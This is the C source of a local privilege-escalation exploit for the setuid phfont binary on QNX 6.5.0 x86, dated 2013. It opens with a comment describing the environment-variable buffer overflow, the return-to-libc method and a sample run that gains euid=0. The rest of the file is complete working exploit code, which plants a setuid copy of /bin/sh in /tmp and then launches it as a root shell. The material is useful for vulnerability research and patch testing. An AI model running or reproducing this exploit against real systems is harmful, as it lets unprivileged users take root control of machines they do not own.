/*
 *          QNX 6.5.0 x86 phfont local root exploit by cenobyte 2013
 *                        <vincitamorpatriae@gmail.com>
 *
 * - vulnerability description:
 * Setuid root /usr/photon/bin/phfont on QNX is prone to a buffer overflow.
 * The vulnerability is due to insufficent bounds checking of the PHOTON_HOME
 * environment variable.
 *
 * - vulnerable platforms:
 * QNX 6.5.0SP1
 * QNX 6.5.0
 * QNX 6.4.1
 *
 * - not vulnerable:
 * QNX 6.3.0
 * QNX 6.2.0
 *
 * - exploit information:
 * This is a return-to-libc exploit that yields euid=0. The addresses of
 * system() and exit() are retrieved from libc using dlsym().
 *
 * During development of this exploit I ran into tty issues after succesfully
 * overwriting the EIP and launching /bin/sh. The following message appeared:
 *
 * No controlling tty (open /dev/tty: No such device or address)
 *
 * The shell became unusable and required a kill -9 to exit. To get around that
 * I had modify the exploit to create a shell script named /tmp/sh which copies
 * /bin/sh to /tmp/shell and then performs a chmod +s on /tmp/shell.
 *
 * During execution of the exploit the argument of system() will be set to sh,
 * and PATH will be set to /tmp. Once /tmp/sh is been executed, the exploit
 * will launch the setuid /tmp/shell yielding the user euid=0.
 *
 * - example:
 * $ uname -a
 * QNX localhost 6.5.0 2010/07/09-14:44:03EDT x86pc x86
 * $ id
 * uid=100(user) gid=100
 * $ ./qnx-phfont
 * QNX 6.5.0 x86 phfont local root exploit by cenobyte 2013
 *
 * [-] system(): 0xb031bd80
 * [-] exit(): 0xb032b5f0
 * [-] sh: 0xb030b7f8
 * [-] now dropping into root shell...
 * # id
 * uid=100(user) gid=100 euid=0(root)
 *
 */

#include <sys/types.h>
#include <sys/stat.h>

#include <dlfcn.h>
#include <err.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define HEADER "QNX 6.5.0 x86 phfont local root exploit by cenobyte 2013"
#define VULN "PHOTON_PATH="
#define OFFSET 416
#define FILENAME "/tmp/sh"

static void createshell(void);
static void fail(void);
static void checknull(unsigned int addr);
static unsigned int find_string(char *s);
static unsigned int is_string(unsigned int addr, char *string);
static unsigned int find_libc(char *syscall);

void createshell(void) {
	int fd;
	char *s="/bin/cp /bin/sh /tmp/shell\n"
		"/bin/chmod 4755 /tmp/shell\n"
		"/bin/chown root:root /tmp/shell\n";

	fd = open(FILENAME, O_RDWR|O_CREAT, S_IRWXU|S_IXGRP|S_IXOTH);
	if (fd < 0)
		errx(1, "cannot open %s for writing", FILENAME);

	write(fd, s, strlen(s));
	close(fd);
}

void
checknull(unsigned int addr)
{
	if (!(addr & 0xff) || \
	    !(addr & 0xff00) || \
	    !(addr & 0xff0000) || \
	    !(addr & 0xff000000))
		errx(1, "return-to-libc failed: " \
		    "0x%x contains a null byte", addr);
}

void
fail(void)
{
	printf("\n");
	errx(1, "return-to-libc failed");
}

unsigned int
is_string(unsigned int addr, char *string)
{
	char *a = addr;

	signal(SIGSEGV, fail);

	if (strcmp(a, string) == 0)
		return(0);

	return(1);
}

unsigned int
find_string(char *string)
{
	unsigned int i;
	printf("[-] %s: ", string);

	for (i = 0xb0300000; i < 0xdeadbeef; i++) {
		if (is_string(i, string) != 0)
			continue;

		printf("0x%x\n", i);
		checknull(i);
		return(i);
	}

	return(1);
}

unsigned int
find_libc(char *syscall)
{
	void *s;
	unsigned int syscall_addr;

	if (!(s = dlopen(NULL, RTLD_LAZY)))
		errx(1, "error: dlopen() failed");

	if (!(syscall_addr = (unsigned int)dlsym(s, syscall)))
		errx(1, "error: dlsym() %s", syscall);

	printf("[-] %s(): 0x%x\n", syscall, syscall_addr);
	checknull(syscall_addr);
	return(syscall_addr);

	return(1);
}

int
main(int argc, char **argv)
{
	unsigned int system_addr;
	unsigned int exit_addr;
	unsigned int sh_addr;

	char env[440];

	printf("%s\n\n", HEADER);

	createshell();

	system_addr = find_libc("system");
	exit_addr = find_libc("exit");
	sh_addr = find_string("sh");

	memset(env, 0xEB, sizeof(env));
	memcpy(env + OFFSET, (char *)&system_addr, 4);
	memcpy(env + OFFSET + 4, (char *)&exit_addr, 4);
	memcpy(env + OFFSET + 8, (char *)&sh_addr, 4);

	setenv("PHOTON_PATH", env, 0);
	system("PATH=/tmp:/bin:/sbin:/usr/bin:/usr/sbin /usr/photon/bin/phfont");

	printf("[-] now dropping into root shell...\n");

	sleep(2);
	if (unlink(FILENAME) != 0)
		printf("error: cannot unlink %s\n", FILENAME);

	system("/tmp/shell");

	return(0);
}